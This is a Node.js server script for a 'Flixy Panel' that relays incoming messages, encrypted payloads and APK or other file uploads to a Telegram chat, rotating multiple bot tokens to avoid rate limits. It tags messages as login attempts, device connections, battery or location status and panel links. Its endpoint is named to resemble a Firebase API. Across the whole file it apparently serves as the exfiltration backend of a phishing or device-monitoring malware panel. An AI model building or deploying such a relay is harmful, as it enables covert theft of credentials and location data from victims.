#!/usr/bin/env node
// Flixy Panel — Telegram Proxy Server  v4 (anti-spam + faster)
// Host on Render / Railway / Fly.io / any Node 18+ host.
// Credentials are in .env — edit that file before deploying.

import "dotenv/config";
import express from "express";
import multer from "multer";
import crypto from "crypto";

const app = express();
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }, // 100 MB
});

// ── Config ─────────────────────────────────────────────────────────────────────
const CHAT_ID         = process.env.TELEGRAM_CHAT_ID ?? "";
const PROXY_SECRET    = process.env.PROXY_SECRET ?? "";
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS ?? "")
  .split(",").map(s => s.trim()).filter(Boolean);
const PORT = Number(process.env.PORT ?? 3001);

// Multiple bot tokens: TELEGRAM_BOT_TOKENS=token1,token2,token3
const BOT_TOKENS = [
  ...(process.env.TELEGRAM_BOT_TOKENS ?? "").split(",").map(s => s.trim()).filter(Boolean),
  ...(process.env.TELEGRAM_BOT_TOKEN   ?? "").split(",").map(s => s.trim()).filter(Boolean),
].filter((v, i, a) => v && a.indexOf(v) === i); // dedupe

// ── Logging ────────────────────────────────────────────────────────────────────
function log(...args) {
  const ts = new Date().toISOString().replace("T", " ").slice(0, 19);
  console.log(`[${ts}]`, ...args);
}

if (BOT_TOKENS.length === 0) {
  log("⚠️  No bot tokens configured! Set TELEGRAM_BOT_TOKENS in .env");
} else {
  log(`✅ Loaded ${BOT_TOKENS.length} bot token(s)`);
}

// ── Rate-limit tracker (Telegram side) ─────────────────────────────────────────
const rateLimitedUntil = new Map(); // token → timestamp

const TEXT_CURSOR = { value: 0 };
const FILE_CURSOR = { value: Math.min(1, Math.max(BOT_TOKENS.length - 1, 0)) };

function getToken(cursorRef) {
  if (BOT_TOKENS.length === 0) return null;
  const now = Date.now();
  for (let i = 0; i < BOT_TOKENS.length; i++) {
    const idx   = (cursorRef.value + i) % BOT_TOKENS.length;
    const token = BOT_TOKENS[idx];
    if ((rateLimitedUntil.get(token) ?? 0) <= now) {
      cursorRef.value = (idx + 1) % BOT_TOKENS.length;
      return token;
    }
  }
  // All rate-limited — pick whichever unlocks soonest
  let best = BOT_TOKENS[0], bestUntil = rateLimitedUntil.get(best) ?? 0;
  for (const t of BOT_TOKENS) {
    const u = rateLimitedUntil.get(t) ?? 0;
    if (u < bestUntil) { best = t; bestUntil = u; }
  }
  const waitSec = Math.ceil((bestUntil - now) / 1000);
  if (waitSec > 0) log(`⏳ All tokens rate-limited. Next free in ~${waitSec}s`);
  return best;
}

function markRateLimited(token, retryAfter) {
  rateLimitedUntil.set(token, Date.now() + (retryAfter + 1) * 1000);
  log(`🚫 Token …${token.slice(-6)} rate-limited for ${retryAfter}s → rotating`);
}

// ── Incoming request rate limiter (anti-spam) ──────────────────────────────────
const requestBuckets = new Map(); // key → { count, reset }

function isRateLimited(key, limit = 25, windowMs = 60_000) {
  const now = Date.now();
  let bucket = requestBuckets.get(key);
  if (!bucket || now > bucket.reset) {
    bucket = { count: 0, reset: now + windowMs };
    requestBuckets.set(key, bucket);
  }
  bucket.count++;
  return bucket.count > limit;
}

// Cleanup old buckets every minute
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of requestBuckets) {
    if (now > v.reset) requestBuckets.delete(k);
  }
}, 60_000);

// ── Retry helper ───────────────────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function withRetry(label, fn, maxAttempts = 8) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      await fn();
      return true;
    } catch (err) {
      if (attempt === maxAttempts) {
        log(`❌ [${label}] gave up after ${maxAttempts} attempts: ${err.message}`);
        return false;
      }
      // Faster backoff for speed, still respectful of Telegram
      const delay = Math.min(800 * Math.pow(1.6, attempt - 1), 25_000);
      log(`⚠️  [${label}] attempt ${attempt} failed (${err.message}) — retry in ${(delay/1000).toFixed(1)}s`);
      await sleep(delay);
    }
  }
  return false;
}

// ── Telegram API helpers ───────────────────────────────────────────────────────
async function tgPost(token, path, bodyInit) {
  const res = await fetch(`https://api.telegram.org/bot${token}${path}`, bodyInit);
  if (res.status === 429) {
    const data = await res.json().catch(() => ({}));
    const retryAfter = data?.parameters?.retry_after ?? 30;
    markRateLimited(token, retryAfter);
    // Small sleep so we don't immediately re-hit the same token
    await sleep(Math.min((retryAfter + 1) * 1000, 5000));
    throw new Error(`429 rate-limited (${retryAfter}s)`);
  }
  if (!res.ok) {
    const body = await res.text().catch(() => "");
    throw new Error(`HTTP ${res.status}: ${body.slice(0, 200)}`);
  }
  return res;
}

// High-priority text messages
async function sendMessage(text, maxAttempts = 8) {
  const label = `msg:${text.slice(0, 45).replace(/\n/g, " ")}`;
  await withRetry(label, () => {
    const token = getToken(TEXT_CURSOR);
    if (!token) return Promise.resolve();
    return tgPost(token, "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  }, maxAttempts);
}

// Lower-priority file uploads
async function sendDocument(fileBuffer, filename, mimetype, caption) {
  const label = `doc:${filename}`;
  await withRetry(label, () => {
    const token = getToken(FILE_CURSOR);
    if (!token) return Promise.resolve();
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append(
      "document",
      new Blob([new Uint8Array(fileBuffer)], { type: mimetype || "application/octet-stream" }),
      filename || "file.bin"
    );
    if (caption) form.append("caption", caption);
    form.append("parse_mode", "HTML");
    return tgPost(token, "/sendDocument", { method: "POST", body: form });
  }, 6);
}

// ── Crypto helpers ─────────────────────────────────────────────────────────────
function deriveKey(secret) {
  return crypto.pbkdf2Sync(secret, "flixy-panel", 100_000, 32, "sha256");
}

function decryptBody(raw, secret) {
  const key       = deriveKey(secret);
  const iv        = Buffer.from(raw.iv, "base64");
  const ctWithTag = Buffer.from(raw.d,  "base64");
  const authTag   = ctWithTag.subarray(-16);
  const cipher    = ctWithTag.subarray(0, -16);
  const dec       = crypto.createDecipheriv("aes-256-gcm", key, iv);
  dec.setAuthTag(authTag);
  const plain = Buffer.concat([dec.update(cipher), dec.final()]);
  return JSON.parse(plain.toString("utf8"));
}

// ── CORS / Origin ──────────────────────────────────────────────────────────────
function applyCors(req, res) {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

function checkOrigin(req, res) {
  if (ALLOWED_ORIGINS.length === 0) return true;
  const origin = req.headers.origin ?? req.headers.referer ?? "";
  if (!ALLOWED_ORIGINS.some(o => origin.startsWith(o))) {
    res.status(403).json({ ok: false, error: "Origin not allowed" });
    return false;
  }
  return true;
}

// Helper to extract real client IP
function getClientIp(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.ip ||
    "unknown"
  );
}

app.use(express.json({ limit: "2mb" }));

// ── Health ─────────────────────────────────────────────────────────────────────
app.get("/api/health", (_req, res) =>
  res.json({ status: "ok", ts: Date.now(), tokens: BOT_TOKENS.length })
);

// ── Preflight ──────────────────────────────────────────────────────────────────
app.options("/api/firebase/fetch", (req, res) => {
  applyCors(req, res);
  res.setHeader("Access-Control-Max-Age", "86400");
  res.status(204).end();
});

// ── Main route ─────────────────────────────────────────────────────────────────
app.post("/api/firebase/fetch", upload.single("file"), (req, res) => {
  applyCors(req, res);
  if (!checkOrigin(req, res)) return;

  const ip     = getClientIp(req);
  const origin = req.headers.origin || req.headers.referer || "no-origin";
  const ua     = (req.headers["user-agent"] || "").slice(0, 80);

  // ── Anti-spam: per-IP rate limit ────────────────────────────────────────────
  if (isRateLimited(`ip:${ip}`, 35, 60_000)) {          // 35 req/min per IP
    log(`🚫 RATE-LIMIT IP ${ip} | origin=${origin}`);
    return res.status(429).json({ ok: false, error: "Too many requests" });
  }

  // Always respond immediately so panel never waits
  res.json({ ok: true });

  if (!CHAT_ID) {
    log("⚠️  TELEGRAM_CHAT_ID not set — skipping forward");
    return;
  }

  const file = req.file;

  // ── File / APK upload ──────────────────────────────────────────────────────
  if (file) {
    // Strict secret check
    if (!PROXY_SECRET || req.body?.secret !== PROXY_SECRET) {
      log(`🔒 REJECTED file from ${ip} | origin=${origin} | bad/missing secret`);
      return;
    }
    const caption = req.body?.caption ?? req.body?.text ?? "";
    log(`📎 FILE from ${ip} | origin=${origin} | ${file.originalname} (${(file.size / 1024).toFixed(1)} KB)`);

    sendDocument(file.buffer, file.originalname, file.mimetype, caption)
      .then(() => log(`✅ File sent: ${file.originalname}`))
      .catch(err => log(`❌ File failed: ${file.originalname} — ${err.message}`));
    return;
  }

  // ── Text / encrypted payload ───────────────────────────────────────────────
  const raw = req.body;
  let text = "";
  let authOk = false;

  if (raw?.d && raw?.iv) {
    // Encrypted path — must have secret
    if (!PROXY_SECRET) {
      log(`⚠️  Encrypted payload but PROXY_SECRET not set | from ${ip}`);
      return;
    }
    try {
      text = decryptBody(raw, PROXY_SECRET).text ?? "";
      authOk = true;
    } catch {
      log(`🔒 REJECTED encrypted from ${ip} | origin=${origin} | decrypt failed`);
      return;
    }
  } else {
    // Plain path — require secret
    if (!PROXY_SECRET || raw?.secret !== PROXY_SECRET) {
      log(`🔒 REJECTED text from ${ip} | origin=${origin} | bad/missing secret | ua=${ua}`);
      return;
    }
    text = raw?.text ?? "";
    authOk = true;
  }

  if (!text || !authOk) return;

  // Detect high-priority legitimate messages
  const isLink    = text.includes("Shareable Panel Link") || text.includes("?s=");
  const isConnect = text.includes("Connected Successfully") || text.includes("Login Attempt");
  const isStatus  = text.includes("Device Online") || text.includes("Battery") || text.includes("Location");
  const kind      = isLink ? "🔗 link" : isConnect ? "🔑 connect" : isStatus ? "📡 status" : "💬 msg";

  // ── Drop obvious spam ──────────────────────────────────────────────────────
  const spamPatterns = /sale\s*chor|teri\s*dh|madarchod|bsdk|randi|chod|fuck\s*you|spam|test\s*spam|free\s*money/i;
  const looksLikeSpam = spamPatterns.test(text) && !isLink && !isConnect && !isStatus;

  if (looksLikeSpam) {
    log(`🗑️ DROPPED spam from ${ip} | origin=${origin} | text="${text.slice(0, 60)}"`);
    return;
  }

  // Extra protection: very short abusive messages
  if (text.length < 25 && /chor|teri|madar|bsdk|randi|fuck|sale/i.test(text)) {
    log(`🗑️ DROPPED short abuse from ${ip} | "${text}"`);
    return;
  }

  log(`${kind} from ${ip} | origin=${origin} | ${text.length} chars | "${text.slice(0, 50).replace(/\n/g, " ")}"`);

  // High-priority gets more retries, normal messages get fewer (faster overall)
  const maxAttempts = (isLink || isConnect) ? 10 : 5;

  sendMessage(text, maxAttempts)
    .then(() => log(`✅ Sent ${kind}`))
    .catch(err => log(`❌ ${kind} failed — ${err.message}`));
});

// Catch-all for unknown routes
app.use((req, res) => {
  const ip = getClientIp(req);
  log(`❓ Unknown ${req.method} ${req.path} from ${ip}`);
  res.status(404).json({ ok: false });
});

app.listen(PORT, () => {
  log(`🚀 Telegram proxy v4 (anti-spam) running on port ${PORT}`);
  log(`   Tokens : ${BOT_TOKENS.length}`);
  log(`   Chat   : ${CHAT_ID || "NOT SET ⚠️"}`);
  log(`   Secret : ${PROXY_SECRET ? "enabled (required)" : "DISABLED — anyone can spam!"}`);
  log(`   Origins: ${ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS.join(", ") : "all allowed (set ALLOWED_ORIGINS!)"}`);
});
